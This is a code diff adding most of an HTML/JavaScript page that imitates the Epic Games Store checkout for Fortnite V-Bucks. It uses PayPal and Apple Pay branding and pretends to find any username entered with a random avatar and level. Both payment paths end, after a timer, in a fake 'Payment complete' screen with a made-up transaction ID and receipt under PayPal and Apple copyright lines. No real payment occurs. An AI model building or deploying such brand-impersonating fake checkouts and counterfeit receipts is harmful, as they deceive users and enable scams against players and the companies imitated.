+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+        Wishlist
+      </button>
+
+      <hr class="sidebar-divider">
+      <div style="font-size:11px;color:var(--muted2);line-height:1.6;">
+        *Extra V-Bucks percentage shown as compared to price of 1,000 V-Bucks pack. Prices may vary by region.
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══ EPIC CHECKOUT MODAL ═══ -->
+<div class="ck-overlay" id="ckOverlay">
+  <div class="ck-modal">
+    <button class="ck-x" onclick="closeCheckout()">✕</button>
+
+    <!-- LEFT: order summary -->
+    <div class="ck-left">
+      <div class="ck-header-row">
+        <div class="ck-epic-logo">
+          <img src="https://companieslogo.com/img/orig/epicgames.D-efd4e950.png?t=1720244494" alt="Epic" style="height:28px;filter:brightness(0) invert(1)">
+        </div>
+        <span class="ck-title">Checkout</span>
+      </div>
+
+      <div class="ck-product-row">
+        <div class="ck-product-thumb" id="ckThumb">
+          <div class="ck-thumb-fn">FORTNITE</div>
+          <img id="ckThumbImg" src="" alt="">
+        </div>
+        <div class="ck-product-name" id="ckProductName">1,000 V-Bucks</div>
+      </div>
+
+      <div class="ck-divider"></div>
+
+      <div class="ck-row"><span class="ck-lbl">Subtotal</span><span class="ck-val" id="ckSubtotal">$8.99</span></div>
+      <div class="ck-row"><span class="ck-lbl">VAT included (16%)</span><span class="ck-val" id="ckVat">$1.24</span></div>
+      <div class="ck-divider"></div>
+      <div class="ck-row ck-total-row"><span class="ck-total-lbl">Total</span><span class="ck-total-val" id="ckTotal">$8.99</span></div>
+
+    </div>
+
+    <!-- RIGHT: payment details -->
+    <div class="ck-right">
+      <div class="ck-user-row">
+        <div class="ck-user-avatar" id="ckUserAvatar">R</div>
+        <span class="ck-user-name" id="ckUserName">player</span>
+      </div>
+
+      <div class="ck-payment-title">Payment Details</div>
+
+      <div class="ck-methods">
+        <div class="ck-method" data-method="card" onclick="selectMethod(this)">
+          <div class="ck-method-icon" style="background:#fff">
+            <svg width="18" height="14" viewBox="0 0 24 16" fill="none"><rect width="24" height="16" rx="2" fill="#e0e0e0"/><rect y="3" width="24" height="4" fill="#aaa"/><rect x="2" y="9" width="6" height="3" rx="1" fill="#888"/></svg>
+          </div>
+          <span>Credit Card / Debit Card</span>
+          <div class="ck-radio"></div>
+        </div>
+        <div class="ck-method active" data-method="paypal" onclick="selectMethod(this)">
+          <div class="ck-method-icon" style="background:#fff;padding:2px">
+            <img src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/250_Paypal_logo-1024.png" style="width:26px;height:20px;object-fit:contain">
+          </div>
+          <span>PayPal</span>
+          <div class="ck-radio ck-radio-active"></div>
+        </div>
+        <div class="ck-method" data-method="apple" onclick="selectMethod(this)">
+          <div class="ck-method-icon" style="background:#000;padding:2px">
+            <img src="https://icons.veryicon.com/png/o/internet--web/modern-payment/icon_-apple-pay.png" style="width:28px;height:20px;object-fit:contain">
+          </div>
+          <span>Apple Pay</span>
+          <div class="ck-radio"></div>
+        </div>
+        <div class="ck-all-methods">All payment methods
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+        </div>
+      </div>
+
+      <div class="ck-save-row">
+        <div class="ck-toggle" id="saveToggle" onclick="this.classList.toggle('on')"><div class="ck-toggle-knob"></div></div>
+        <div>
+          <div class="ck-save-title">Save payment method for future purchases</div>
+          <div class="ck-save-sub">Saving this payment method will make it the default method for your Epic Games account purchases on PC and mobile.</div>
+        </div>
+      </div>
+
+      <button class="ck-buy-btn" id="ckBuyBtn" onclick="startPayment()">
+        <span id="ckBuyLabel">PayPal</span>
+      </button>
+
+      <div class="ck-legal">By selecting '<span id="ckLegalMethod">PayPal</span>', you certify that you are over 18, are authorized to use this payment method, and agree to the <a href="#" style="color:var(--cyan)">End User License Agreement</a>. You are paying for a digital license for this product; for terms, see <a href="#" style="color:var(--cyan)">purchase policy</a>.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PAYPAL MODAL ═══ -->
+<div class="pp-overlay" id="ppOverlay">
+  <div class="pp-modal">
+
+    <!-- LOGIN STATE -->
+    <div class="pp-state active" id="stateLogin">
+      <div class="pp2-header">
+        <div style="width:28px"></div>
+        <img src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/250_Paypal_logo-1024.png" style="height:28px;object-fit:contain">
+        <button class="pp2-close" id="ppClose" onclick="closePaypal()">✕</button>
+      </div>
+      <div class="pp2-body">
+        <div class="pp2-login-title">Pay with PayPal</div>
+        <div class="pp2-login-sub">Enter your email address to get started.</div>
+        <div class="pp2-email-wrap">
+          <input class="pp2-email-input" id="ppEmailInput" type="email" placeholder="Email or mobile number" value="ca*****@gmail.com">
+        </div>
+        <div class="pp2-forgot">Forgot email?</div>
+        <button class="pp2-next-btn" onclick="doPaypalNext()">Next</button>
+        <div class="pp2-or"><span>or</span></div>
+        <button class="pp2-create-btn">Create an Account</button>
+      </div>
+      <div class="pp2-footer">
+        <span style="color:#0070ba;font-size:12px;cursor:pointer">Cancel and return to Epic Games Store</span>
+      </div>
+    </div>
+
+    <!-- PROCESSING STATE -->
+    <div class="pp-state" id="stateProcessing">
+      <div class="pp2-header">
+        <div style="width:28px"></div>
+        <img src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/250_Paypal_logo-1024.png" style="height:28px;object-fit:contain">
+        <div style="width:28px"></div>
+      </div>
+      <div class="pp2-body">
+        <div class="pp2-user-row">
+          <div class="pp2-user-avatar" id="ppUserAvatar">R</div>
+          <div>
+            <div class="pp2-user-name" id="ppUserName">player</div>
+            <div class="pp2-user-email" id="ppUserEmail">ca*****@gmail.com</div>
+          </div>
+        </div>
+        <div class="pp2-amount-box">
+          <div class="pp2-amount-label">Amount due</div>
+          <div class="pp2-amount" id="ppAmount">$8.99</div>
+          <div class="pp2-amount-sub">V-Bucks · Epic Games Store</div>
+        </div>
+        <div class="pp2-processing-row">
+          <div class="pp2-spinner"></div>
+          <span>Completing your purchase…</span>
+        </div>
+        <div class="pp2-progress-wrap"><div class="pp2-progress-bar" id="progressBar"></div></div>
+        <div class="pp2-note">Please don't close this window. This will only take a moment.</div>
+      </div>
+      <div class="pp2-footer">
+        <img src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/250_Paypal_logo-1024.png" style="height:16px;opacity:.4;object-fit:contain">
+        <span>Buyer and Seller Protection</span>
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      </div>
+    </div>
+
+    <!-- SUCCESS STATE -->
+    <div class="pp-state" id="stateSuccess">
+      <div class="pp2-header">
+        <img src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/250_Paypal_logo-1024.png" style="height:32px;object-fit:contain">
+      </div>
+      <div class="pp2-body">
+        <div class="pp2-success-icon">
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="pp2-success-title">Payment complete</div>
+        <div class="pp2-success-amount" id="successAmount">$8.99</div>
+
+        <div class="pp2-receipt-card">
+          <div class="pp2-receipt-header">Transaction details</div>
+          <div class="pp2-receipt-row"><span>Transaction ID</span><span id="txnId">—</span></div>
+          <div class="pp2-receipt-row"><span>Date</span><span id="txnDate">—</span></div>
+          <div class="pp2-receipt-row"><span>Merchant</span><span>Epic Games, Inc.</span></div>
+          <div class="pp2-receipt-row"><span>Recipient</span><span id="txnRecipient">—</span></div>
+          <div class="pp2-receipt-row"><span>V-Bucks</span><span id="txnVbucks">—</span></div>
+          <div class="pp2-receipt-divider"></div>
+          <div class="pp2-receipt-row pp2-receipt-total"><span>Total paid</span><span id="txnAmount">—</span></div>
+        </div>
+
+        <button class="pp2-okay-btn" onclick="closePaypal()">Done</button>
+        <div class="pp2-report">Report a problem</div>
+      </div>
+      <div class="pp2-footer">
+        <img src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/250_Paypal_logo-1024.png" style="height:16px;opacity:.4;object-fit:contain">
+        <span>© 2025 PayPal, Inc. All rights reserved.</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══ APPLE PAY MODAL ═══ -->
+<div class="ap-overlay" id="apOverlay">
+  <div class="ap-modal">
+    <div class="ap-scan-box">
+      <div class="ap-rings">
+        <div class="ap-ring" style="--s:200px;--op:.55;--d:0s"></div>
+        <div class="ap-ring" style="--s:168px;--op:.45;--d:.15s"></div>
+        <div class="ap-ring" style="--s:136px;--op:.4;--d:.3s"></div>
+        <div class="ap-ring" style="--s:104px;--op:.35;--d:.45s"></div>
+        <div class="ap-ring" style="--s:72px;--op:.3;--d:.6s"></div>
+      </div>
+      <div class="ap-center">
+        <img src="https://pngimg.com/uploads/apple_logo/apple_logo_PNG19664.png" style="width:18px;height:18px;object-fit:contain;filter:brightness(0)">
+        <span style="font-size:11px;font-weight:700;color:#111;margin-top:2px">Pay</span>
+      </div>
+    </div>
+    <div class="ap-title" id="apTitle">Scan Code with iPhone</div>
+    <div class="ap-sub" id="apSub">Use the Camera app to continue your Apple Pay purchase on your iPhone. Requires iOS 18 or later.</div>
+    <div class="ap-footer-text">Copyright © 2026 Apple Inc. All rights reserved. <a href="#" style="color:#0070c9">Privacy Policy</a></div>
+  </div>
+</div>
+
+<script>
+const PACKS = [
+  { vbucks:400,   usd:3.99,  extra:null,        color:'c-blue',   bg:'linear-gradient(135deg,#1a6fd4,#003a8c)', img:'https://cms-assets.unrealengine.com/ARtnWWOBTeyImV0LDW3Plz/cmf2yerk51b7g07oi0x73yw1k' },
+  { vbucks:1000,  usd:8.99,  extra:null,        color:'c-green',  bg:'linear-gradient(135deg,#1db954,#0a6e30)', img:'https://cms-assets.unrealengine.com/ARtnWWOBTeyImV0LDW3Plz/cmf2yerk51b7g07oi0x73yw1k' },
+  { vbucks:2800,  usd:22.99, extra:'9% EXTRA',  color:'c-lblue',  bg:'linear-gradient(135deg,#00b4ff,#005c99)', img:'https://cms-assets.unrealengine.com/ARtnWWOBTeyImV0LDW3Plz/cmf2ygsew1bn807oicjnkjx5o' },
+  { vbucks:5000,  usd:36.99, extra:'22% EXTRA', color:'c-purple', bg:'linear-gradient(135deg,#9b27af,#4a0870)', img:'https://cms-assets.unrealengine.com/ARtnWWOBTeyImV0LDW3Plz/cmf2yi10w1c5907n3m1hm3rpi' },
+  { vbucks:13500, usd:89.99, extra:'35% EXTRA', color:'c-orange', bg:'linear-gradient(135deg,#ff6b1a,#b83000)', img:'https://cms-assets.unrealengine.com/ARtnWWOBTeyImV0LDW3Plz/cmf2yr9av1f2y07n3c3pvp5lh' },
+];
+
+let selectedPack = PACKS[1];
+let userFound = false;
+let progressInterval = null;
+
+function buildPacks() {
+  const row = document.getElementById('packsRow');
+  PACKS.forEach((p, i) => {
+    const el = document.createElement('div');
+    el.className = 'pack-item' + (i === 1 ? ' active' : '');
+    el.innerHTML = `
+      <div class="pack-radio"><div class="pack-radio-dot"></div></div>
+      <div class="pack-thumb ${p.color}"><img src="${p.img}" alt="" style="width:100%;height:100%;object-fit:cover"></div>
+      <div class="pack-info">
+        <div class="pack-name">${p.vbucks.toLocaleString()} V-Bucks ${p.extra ? `<span class="pack-extra">${p.extra}*</span>` : ''}</div>
+        <div class="pack-sub">Fortnite Add-On</div>
+      </div>
+      <div class="pack-price-tag">$${p.usd.toFixed(2)}</div>
+    `;
+    el.addEventListener('click', () => {
+      document.querySelectorAll('.pack-item').forEach(x => x.classList.remove('active'));
+      el.classList.add('active');
+      selectedPack = p;
+      updateUI();
+    });
+    row.appendChild(el);
+  });
+}
+
+function updateUI() {
+  document.getElementById('productTitle').textContent = selectedPack.vbucks.toLocaleString() + ' V-Bucks';
+  document.getElementById('descAmount').textContent = selectedPack.vbucks.toLocaleString();
+  document.getElementById('sidebarPrice').textContent = '$' + selectedPack.usd.toFixed(2);
+  document.getElementById('heroCoinImg').src = selectedPack.img;
+  document.getElementById('sidebarCoinImg').src = selectedPack.img;
+  document.querySelector('.hero-banner').style.background = selectedPack.bg;
+  document.querySelector('.sidebar-thumb').style.background = selectedPack.bg;
+  updateBuyBtn();
+}
+
+function updateBuyBtn() {
+  document.getElementById('buyBtn').disabled = !userFound;
+}
+
+async function searchUser() {
+  const raw = document.getElementById('usernameInput').value.trim().replace(/^@/, '');
+  const errEl = document.getElementById('errorMsg');
+  const box = document.getElementById('userFoundBox');
+  const btn = document.getElementById('searchBtn');
+  errEl.style.display = 'none';
+  box.classList.remove('show');
+  if (!raw) { errEl.textContent = 'Please enter an Epic username.'; errEl.style.display = 'block'; return; }
+  btn.classList.add('loading'); btn.disabled = true;
+  const FN_SKINS = [
+    'https://www.pngarts.com/files/10/Fortnite-Skin-Thumbnail-Battle-PNG-Image-Background.png',
+    'https://wallpapers.com/images/featured-full/fortnite-skins-png-h3i4vazgzx4t9ttc.png',
+    'https://cdn.pfps.gg/pfps/8901-fortnite-27.png',
+    'https://cdn.pfps.gg/pfps/3851-fortnite.png',
+    'https://i.pinimg.com/736x/e5/ea/ec/e5eaec9db5a81ef954901efa5f05fd5d.jpg',
+    'https://wallpapers.com/images/hd/fortnite-pfp-bullseye-close-up-lscozoz86a7xlhay.jpg',
+    'https://i.pinimg.com/originals/fc/95/5b/fc955bf9d71d1c0c1ec95935f23a05bb.jpg',
+    'https://i.pinimg.com/originals/e7/1f/5b/e71f5b8396380cfab66fe795db437b8b.png',
+    'https://wallpapers.com/images/hd/iconic-fortnite-skins-png-05212024-o5z2n9scmjvnrlr0.png',
+    'https://wallpapers.com/images/hd/best-fortnite-skins-png-xdl50-7xuiszk476dzxild.png',
+    'https://wallpapers.com/images/hd/rare-fortnite-skins-png-uhc-bi0f5fgyx7p7gg2d.png',
+    'https://mir-s3-cdn-cf.behance.net/project_modules/max_1200/3136f7105873929.5f8330ea8a71d.jpg',
+    'https://mir-s3-cdn-cf.behance.net/project_modules/disp/22ce1e113352831.6025c0f758e11.png',
+    'https://mir-s3-cdn-cf.behance.net/project_modules/1400/4bdf28111934837.60e19c6311918.jpg',
+    'https://mir-s3-cdn-cf.behance.net/project_modules/1400/52d47a111934837.60dcb6fb0a6b0.jpg',
+  ];
+  const randomSkin = FN_SKINS[Math.floor(Math.random() * FN_SKINS.length)];
+  document.getElementById('userAvatar').src = randomSkin;
+  document.getElementById('userName').textContent = raw.charAt(0).toUpperCase() + raw.slice(1);
+  document.getElementById('userMeta').textContent = 'Epic Games · Level ' + (Math.floor(Math.random() * 250) + 20);
+  box.classList.add('show');
+  userFound = true;
+  updateBuyBtn();
+  btn.classList.remove('loading'); btn.disabled = false;
+}
+
+let activeMethod = 'paypal';
+
+function openCheckout() {
+  if (!userFound || !selectedPack) return;
+  const vat = Math.round(selectedPack.usd * 0.16 * 100) / 100;
+  document.getElementById('ckProductName').textContent = selectedPack.vbucks.toLocaleString() + ' V-Bucks';
+  document.getElementById('ckThumbImg').src = selectedPack.img;
+  document.getElementById('ckThumb').style.background = selectedPack.bg;
+  document.getElementById('ckSubtotal').textContent = '$' + selectedPack.usd.toFixed(2);
+  document.getElementById('ckVat').textContent = '$' + vat.toFixed(2);
+  document.getElementById('ckTotal').textContent = '$' + selectedPack.usd.toFixed(2);
+
+  const uname = document.getElementById('userName').textContent;
+  document.getElementById('ckUserName').textContent = uname;
+  const ckAvEl = document.getElementById('ckUserAvatar');
+  const avSrc = document.getElementById('userAvatar').src;
+  if (avSrc) { ckAvEl.innerHTML = `<img src="${avSrc}" alt="">`; } else { ckAvEl.textContent = uname.charAt(0).toUpperCase(); }
+  document.getElementById('ckOverlay').classList.add('show');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeCheckout() {
+  document.getElementById('ckOverlay').classList.remove('show');
+  document.body.style.overflow = '';
+}
+
+function selectMethod(el) {
+  document.querySelectorAll('.ck-method').forEach(m => {
+    m.classList.remove('active');
+    m.querySelector('.ck-radio').classList.remove('ck-radio-active');
+  });
+  el.classList.add('active');
+  el.querySelector('.ck-radio').classList.add('ck-radio-active');
+  activeMethod = el.dataset.method;
+  const btn = document.getElementById('ckBuyBtn');
+  const lbl = document.getElementById('ckBuyLabel');
+  const legal = document.getElementById('ckLegalMethod');
+  btn.className = 'ck-buy-btn';
+  if (activeMethod === 'paypal') {
+    lbl.innerHTML = '<svg width="90" height="22" viewBox="0 0 90 22"><text y="18" font-family="Arial" font-weight="900" font-size="20" fill="#003087">Pay</text><text x="44" y="18" font-family="Arial" font-weight="900" font-size="20" fill="#009cde">Pal</text></svg>';
+    legal.textContent = 'PayPal';
+  } else if (activeMethod === 'apple') {
+    btn.classList.add('apple-style');
+    lbl.innerHTML = 'Buy with <img src="https://pngimg.com/uploads/apple_logo/apple_logo_PNG19664.png" style="width:16px;height:16px;object-fit:contain;filter:invert(1);vertical-align:middle;margin:0 2px"> Pay';
+    legal.textContent = 'Buy with ApplePay';
+  } else {
+    btn.classList.add('card-style');
+    lbl.textContent = 'Pay with Card';
+    legal.textContent = 'Credit Card / Debit Card';
+  }
+}
+
+function startPayment() {
+  closeCheckout();
+  if (activeMethod === 'apple') {
+    startApplePay();
+  } else {
+    startPaypal();
+  }
+}
+
+function startPaypal() {
+  const uname = document.getElementById('userName').textContent;
+  document.getElementById('ppUserName').textContent = uname;
+  const ppAvEl = document.getElementById('ppUserAvatar');
+  const avSrc = document.getElementById('userAvatar').src;
+  if (avSrc) { ppAvEl.innerHTML = `<img src="${avSrc}" alt="">`; } else { ppAvEl.textContent = uname.charAt(0).toUpperCase(); }
+  document.getElementById('ppAmount').textContent = '$' + selectedPack.usd.toFixed(2);
+  document.getElementById('stateLogin').classList.add('active');
+  document.getElementById('stateSuccess').classList.remove('active');
+  document.getElementById('progressBar').style.width = '0%';
+  document.getElementById('ppOverlay').classList.add('show');
+  document.body.style.overflow = 'hidden';
+}
+
+function showPaypalSuccess() {
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('en-US', {month:'short',day:'numeric',year:'numeric'}) + ' · ' + now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
+  const txnId = 'PP-' + Math.random().toString(36).slice(2,8).toUpperCase() + Math.random().toString(36).slice(2,6).toUpperCase();
+  const total = '$' + selectedPack.usd.toFixed(2);
+  document.getElementById('successAmount').textContent = total;
+  document.getElementById('txnId').textContent = txnId;
+  document.getElementById('txnDate').textContent = dateStr;
+  document.getElementById('txnRecipient').textContent = document.getElementById('userName').textContent;
+  document.getElementById('txnVbucks').textContent = selectedPack.vbucks.toLocaleString() + ' V-Bucks';
+  document.getElementById('txnAmount').textContent = total;
+  document.getElementById('ppClose').style.display = 'none';
+  document.getElementById('stateProcessing').classList.remove('active');
+  document.getElementById('stateSuccess').classList.add('active');
+}
+
+function closePaypal() {
+  document.getElementById('ppOverlay').classList.remove('show');
+  document.body.style.overflow = '';
+  clearInterval(progressInterval);
+  document.querySelectorAll('.pp-state').forEach(s => s.classList.remove('active'));
+  document.getElementById('progressBar').style.width = '0%';
+  const sd = document.getElementById('apSuccessDiv');
+  if (sd) sd.classList.remove('show');
+}
+
+function doPaypalNext() {
+  const email = document.getElementById('ppEmailInput').value.trim();
+  document.getElementById('ppUserEmail').textContent = email || 'paypal@gmail.com';
+  document.getElementById('stateLogin').classList.remove('active');
+  document.getElementById('stateProcessing').classList.add('active');
+  let progress = 0;
+  clearInterval(progressInterval);
+  progressInterval = setInterval(() => {
+    progress += (100 - progress) * 0.04;
+    document.getElementById('progressBar').style.width = Math.min(progress, 92) + '%';
+  }, 80);
+  setTimeout(() => {
+    clearInterval(progressInterval);
+    document.getElementById('progressBar').style.width = '100%';
+    setTimeout(showPaypalSuccess, 300);
+  }, 3200);
+}
+
+function startApplePay() {
+  const ap = document.getElementById('apOverlay');
+  document.getElementById('apTitle').textContent = 'Scan Code with iPhone';
+  document.getElementById('apSub').textContent = 'Use the Camera app to continue your Apple Pay purchase on your iPhone. Requires iOS 18 or later.';
+  document.querySelector('.ap-scan-box').style.display = 'flex';
+  document.querySelector('.ap-success') && (document.querySelector('.ap-success').classList.remove('show'));
+  ap.classList.add('show');
+  document.body.style.overflow = 'hidden';
+  setTimeout(() => {
+    document.querySelector('.ap-scan-box').style.display = 'none';
+    document.getElementById('apTitle').textContent = 'Payment Detected!';
+    document.getElementById('apSub').textContent = '';
+    let successDiv = document.getElementById('apSuccessDiv');
+    if (!successDiv) {
+      successDiv = document.createElement('div');
+      successDiv.id = 'apSuccessDiv';
+      successDiv.className = 'ap-success show';
+      successDiv.innerHTML = `
+        <div class="ap-check"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1dc655" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+        <div class="ap-success-amount">$${selectedPack.usd.toFixed(2)}</div>
+        <div class="ap-success-sub">Apple Pay payment successful</div>
+        <button class="ap-okay" onclick="document.getElementById('apOverlay').classList.remove('show');document.body.style.overflow=''">Okay!</button>
+      `;
+      document.querySelector('.ap-modal').insertBefore(successDiv, document.querySelector('.ap-footer-text'));
+    } else {
+      successDiv.classList.add('show');
+      successDiv.querySelector('.ap-success-amount').textContent = '$' + selectedPack.usd.toFixed(2);
+    }
+  }, 3000);
+}
+
+document.getElementById('ppOverlay').addEventListener('click', e => {
+  if (e.target === document.getElementById('ppOverlay')) closePaypal();
+});
+document.getElementById('ckOverlay').addEventListener('click', e => {
+  if (e.target === document.getElementById('ckOverlay')) closeCheckout();
+});
+document.getElementById('usernameInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') searchUser();
+});
+
+buildPacks();
+updateUI();
+</script>
+</body>
+</html>
